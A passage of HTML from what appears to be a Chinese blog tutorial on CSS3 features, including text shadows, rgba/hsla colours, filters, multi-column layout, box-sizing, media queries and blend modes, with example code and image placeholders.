height:60px;\n}\n&lt;/style&gt;\n</code></pre><p>运行结果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40ad1173590?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"478\" data-height=\"104\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;478&quot; height=&quot;104&quot;&gt;&lt;/svg&gt;\"></p><p>这样写，就算在不是webkit内核的浏览器，也可以优雅降级（高度=行高*行数（webkit-line-clamp））！</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40ade487b37?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"481\" data-height=\"108\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;481&quot; height=&quot;108&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-39\">文字阴影</h3><p>语法：text-shadow:水平阴影，垂直阴影，模糊的距离，以及阴影的颜色。<br>栗子：<code>text-shadow: 0 0 10px #f00;</code><br>效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40b041a1fd2?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"378\" data-height=\"78\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;378&quot; height=&quot;78&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-40\">11.颜色</h2><p>这个其实就是css3提供了新的颜色表示方法。</p><h3 data-id=\"heading-41\">rgba</h3><p>一个是rgba（rgb为颜色值，a为透明度）</p><pre class=\"hljs bash\"><code>color: rgba(255,00,00,1);\nbackground: rgba(00,00,00,.5);\n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40b1020cb2b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"70\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;70&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-42\">hsla</h3><p>h:色相”，“s：饱和度”，“l：亮度”，“a：透明度”<br>这个我姿势了解过，没用过，这里简单给一个例子</p><pre class=\"hljs bash\"><code>color: hsla( 112, 72%, 33%, 0.68);\nbackground-color: hsla( 49, 65%, 60%, 0.68);</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40b1982d846?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"800\" data-height=\"62\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;62&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-43\">12.渐变</h2><p>css3的渐变可以说是一大亮点，提供了线性渐变，径向渐变，圆锥渐变（w3c和菜鸟教程都没有提及，是我从一篇文章了解到，但是我自己在谷歌浏览器尝试，却是一个无效的写法！大家如果知道怎么用，请告知！感谢）<br>渐变这一部分，由于用法灵活，功能也强大，这个写起来很长，写一点又感觉没什么意思，我这里贴几个链接教程给大家，在文章我不多说了，毕竟我也是从那几个地方学的，他们写得也是比我好，比我详细！</p><p><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.w3cplus.com%2Fcontent%2Fcss3-gradient\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CSS3 Gradient</a><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.w3cplus.com%2Fcss3%2Fnew-css3-linear-gradient.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">再说CSS3渐变——线性渐变</a><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.w3cplus.com%2Fcss3%2Fnew-css3-radial-gradient.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">再说CSS3渐变——径向渐变</a><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.cnblogs.com%2Fcoco1s%2Fp%2F7079529.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">神奇的 conic-gradient 圆锥渐变</a>（这篇就是看我看到圆锥渐变的文章）</p><h2 data-id=\"heading-44\">13.Filter（滤镜）</h2><p>css3的滤镜也是一个亮点，功能强大，写法也灵活。</p><p>栗子代码如下</p><pre class=\"hljs bash\"><code>&lt;p&gt;原图&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> /&gt;\n&lt;p&gt;黑白色filter: grayscale(100%)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter: grayscale(100%);\"</span>/&gt;\n&lt;p&gt;褐色filter:sepia(1)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:sepia(1);\"</span>/&gt;\n&lt;p&gt;饱和度saturate(2)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:saturate(2);\"</span>/&gt;\n&lt;p&gt;色相旋转hue-rotate(90deg)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:hue-rotate(90deg);\"</span>/&gt;\n&lt;p&gt;反色filter:invert(1)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:invert(1);\"</span>/&gt;\n&lt;p&gt;透明度opacity(.5)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:opacity(.5);\"</span>/&gt;\n&lt;p&gt;亮度brightness(.5)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:brightness(.5);\"</span>/&gt;\n&lt;p&gt;对比度contrast(2)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:contrast(2);\"</span>/&gt;\n&lt;p&gt;模糊blur(3px)&lt;/p&gt;\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:blur(3px);\"</span>/&gt;\n&lt;p&gt;阴影drop-shadow(5px 5px 5px <span class=\"hljs-comment\">#000)&lt;/p&gt;</span>\n&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"filter:drop-shadow(5px 5px 5px #000);\"</span>/&gt;</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40b572d68f3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"504\" data-height=\"357\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;504&quot; height=&quot;357&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40b5afd99e3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"528\" data-height=\"716\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;528&quot; height=&quot;716&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40b90fc686d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"511\" data-height=\"728\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;511&quot; height=&quot;728&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40ba1d3f153?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"511\" data-height=\"721\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;511&quot; height=&quot;721&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40bb553546a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"513\" data-height=\"723\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;513&quot; height=&quot;723&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40bbb4e9a7d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"519\" data-height=\"715\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;519&quot; height=&quot;715&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-45\">14.弹性布局</h2><p>这里说的弹性布局，就是flex；这一块要讲的话，必须要全部讲完，不讲完没什么意思，反而会把大家搞蒙！讲完也是很长，所以，这里我也只贴教程网址。博客讲的很好，很详细！</p><p><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2015%2F07%2Fflex-grammar.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Flex 布局教程：语法篇</a><br><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.ruanyifeng.com%2Fblog%2F2015%2F07%2Fflex-examples.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Flex 布局教程：实例篇</a></p><h2 data-id=\"heading-46\">15.栅格布局</h2><p>栅格化布局，就是grid；这一块和flex一样，要讲就必须讲完。这块的内容和flex差不多，也有点长，这里我也贴链接，这个链接讲得也很详细！<br></p><p><a href=\"https://link.juejin.im?target=http%3A%2F%2Fwww.jianshu.com%2Fp%2Fd183265a8dad\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">Grid布局指南</a></p><h2 data-id=\"heading-47\">16.多列布局</h2><p>这一块，我也是了解过，我觉得多列应该还是挺有用的。虽然我没在项目中用过，下面我简单说下！举个例子！这个属性，建议加私有前缀，兼容性有待提高！<br>html</p><pre class=\"hljs bash\"><code>&lt;div class=<span class=\"hljs-string\">\"newspaper\"</span>&gt;\n当我年轻的时候，我梦想改变这个世界；当我成熟以后，我发现我不能够改变这个世界，我将目光缩短了些，决定只改变我的国家；当我进入暮年以后，我发现我不能够改变我们的国家，我的最后愿望仅仅是改变一下我的家庭，但是，这也不可能。当我现在躺在床上，行将就木时，我突然意识到：如果一开始我仅仅去改变我自己，然后，我可能改变我的家庭；在家人的帮助和鼓励下，我可能为国家做一些事情；然后，谁知道呢?我甚至可能改变这个世界。\n&lt;/div&gt;</code></pre><p>css</p><pre class=\"hljs bash\"><code>.newspaper\n{\n    column-count: 3;\n    -webkit-column-count: 3;\n    -moz-column-count: 3;\n    column-rule:2px solid <span class=\"hljs-comment\">#000;</span>\n    -webkit-column-rule:2px solid <span class=\"hljs-comment\">#000;</span>\n    -mox-column-rule:2px solid <span class=\"hljs-comment\">#000;</span>\n}    \n</code></pre><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40c0e0a6508?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"587\" data-height=\"163\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;587&quot; height=&quot;163&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-48\">17.盒模型定义</h2><p>box-sizing这个属性，网上说法是：属性允许您以特定的方式定义匹配某个区域的特定元素。</p><p>这个大家看着可能不知道在说什么，简单粗暴的理解就是：box-sizing:border-box的时候，边框和padding包含在元素的宽高之内！如下图</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/4/1601f4be4c14ae21?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"1040\" data-height=\"797\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;1040&quot; height=&quot;797&quot;&gt;&lt;/svg&gt;\"><br></p><p>box-sizing:content-box的时候，边框和padding不包含在元素的宽高之内！如下图<br></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/12/4/1601f4c0c8ceb5b0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"950\" data-height=\"876\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;950&quot; height=&quot;876&quot;&gt;&lt;/svg&gt;\"><br></p><h2 data-id=\"heading-49\">18.媒体查询</h2><p>媒体查询，就在监听屏幕尺寸的变化，在不同尺寸的时候显示不同的样式！在做响应式的网站里面，是必不可少的一环！不过由于我最近的项目都是使用rem布局。所以媒体查询就没怎么用了！但是，媒体查询，还是很值得一看的！说不定哪一天就需要用上了！</p><p>栗子代码如下</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=<span class=\"hljs-string\">\"utf-8\"</span>&gt; \n&lt;title&gt;&lt;/title&gt; \n&lt;style&gt;\nbody {\n    background-color: pink;\n}\n@media screen and (max-width: 960px) {\n    body {\n        background-color: darkgoldenrod;\n    }\n}\n@media screen and (max-width: 480px) {\n    body {\n        background-color: lightgreen;\n    }\n}\n&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;h1&gt;重置浏览器窗口查看效果！&lt;/h1&gt;\n&lt;p&gt;如果媒体类型屏幕的可视窗口宽度小于 960 px ，背景颜色将改变。&lt;/p&gt;\n&lt;p&gt;如果媒体类型屏幕的可视窗口宽度小于 480 px ，背景颜色将改变。&lt;/p&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40c47144d22?imageslim\" data-width=\"800\" data-height=\"123\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;800&quot; height=&quot;123&quot;&gt;&lt;/svg&gt;\"></p><h2 data-id=\"heading-50\">19.混合模式</h2><p>混合模式，就像photoshop里面的混合模式！这一块，我了解过，在项目上没用过，但是我觉得这个应该不会没有用武之地！<br>css3的混合模式，两个（background-blend-mode和mix-blend-mode）。这两个写法和显示效果都非常像！区别就在于background-blend-mode是用于同一个元素的背景图片和背景颜色的。mix-blend-mode用于一个元素的背景图片或者颜色和子元素的。看以下代码，区别就出来了！</p><blockquote><p>这一块图片很多，大家看图片快速扫一眼，看下什么效果就好！</p></blockquote><h3 data-id=\"heading-51\">background-blend-mode</h3><p>代码</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n        &lt;title&gt;&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;style&gt;\n        div{\n            width: 480px;\n            height: 300px;\n            background:url(<span class=\"hljs-string\">'test.jpg'</span>)no-repeat,<span class=\"hljs-comment\">#09f;</span>\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;!----&gt;\n        \n        &lt;p&gt;原图&lt;/p&gt;\n        &lt;div&gt;&lt;/div&gt;\n        &lt;p&gt;multiply正片叠底&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: multiply;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;screen滤色&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: screen;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;overlay叠加&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: overlay;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;darken变暗&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: darken;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;lighten变亮&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: lighten;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;color-dodge颜色减淡模式&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: color-dodge;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;color-burn颜色加深&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: color-burn;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;hard-light强光&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: hard-light;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;soft-light柔光&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: soft-light;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;difference差值&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: difference;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;exclusion排除&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: exclusion;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;hue色相&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: hue;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;saturation饱和度&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: saturation;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;color颜色&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: color;\"</span>&gt;&lt;/div&gt;\n        &lt;p&gt;luminosity亮度&lt;/p&gt;\n        &lt;div style=<span class=\"hljs-string\">\"background-blend-mode: luminosity;\"</span>&gt;&lt;/div&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40c5c7ea3e0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"502\" data-height=\"362\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;502&quot; height=&quot;362&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40c61bce8f7?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"506\" data-height=\"710\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;506&quot; height=&quot;710&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40c76b5a3eb?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"512\" data-height=\"711\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;512&quot; height=&quot;711&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40c8861f5e9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"516\" data-height=\"711\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;516&quot; height=&quot;711&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40ca09bfdc1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"514\" data-height=\"353\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;514&quot; height=&quot;353&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40d3994c51f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"523\" data-height=\"709\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;523&quot; height=&quot;709&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40d1f9a1f22?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"521\" data-height=\"708\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;521&quot; height=&quot;708&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40d36966c02?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"544\" data-height=\"713\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;544&quot; height=&quot;713&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40d36664987?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"525\" data-height=\"705\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;525&quot; height=&quot;705&quot;&gt;&lt;/svg&gt;\"></p><h3 data-id=\"heading-52\">mix-blend-mode</h3><p>代码</p><pre class=\"hljs bash\"><code>&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n    &lt;head&gt;\n        &lt;meta charset=<span class=\"hljs-string\">\"UTF-8\"</span>&gt;\n        &lt;title&gt;&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;style&gt;\n        div{\n            padding: 20px;\n            width: 480px;\n            background: <span class=\"hljs-comment\">#09f;</span>\n        }\n    &lt;/style&gt;\n    &lt;body&gt;\n        &lt;p&gt;原图&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;multiply正片叠底&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: multiply;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;screen滤色&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: screen;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;overlay叠加&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: overlay;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;darken变暗&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: darken;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;lighten变亮&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: lighten;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;color-dodge颜色减淡模式&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: color-dodge;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;color-burn颜色加深&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: color-burn;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;hard-light强光&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: hard-light;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;soft-light柔光&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: soft-light;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;difference差值&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: difference;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;exclusion排除&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: exclusion;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;hue色相&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: hue;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;saturation饱和度&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: saturation;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;color颜色&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: color;\"</span>/&gt;&lt;/div&gt;\n        &lt;p&gt;luminosity亮度&lt;/p&gt;\n        &lt;div&gt;&lt;img src=<span class=\"hljs-string\">\"test.jpg\"</span> style=<span class=\"hljs-string\">\"mix-blend-mode: luminosity;\"</span>/&gt;&lt;/div&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre><p>运行效果</p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40d508df598?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"556\" data-height=\"406\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;556&quot; height=&quot;406&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40d89f994e3?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"550\" data-height=\"400\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;550&quot; height=&quot;400&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40def2be26e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"554\" data-height=\"400\" src=\"data:image/svg+xml;utf8,&lt;?xml version=&quot;1.0&quot;?&gt;&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; version=&quot;1.1&quot; width=&quot;554&quot; height=&quot;400&quot;&gt;&lt;/svg&gt;\"></p><p><img class=\"lazyload inited\" data-src=\"https://user-gold-cdn.xitu.io/2017/11/15/15fbf40decde2709?imageView2/0/w/1280/h/960/format/webp/ignore-error/1\" data-width=\"554\" data-height=\"398\" 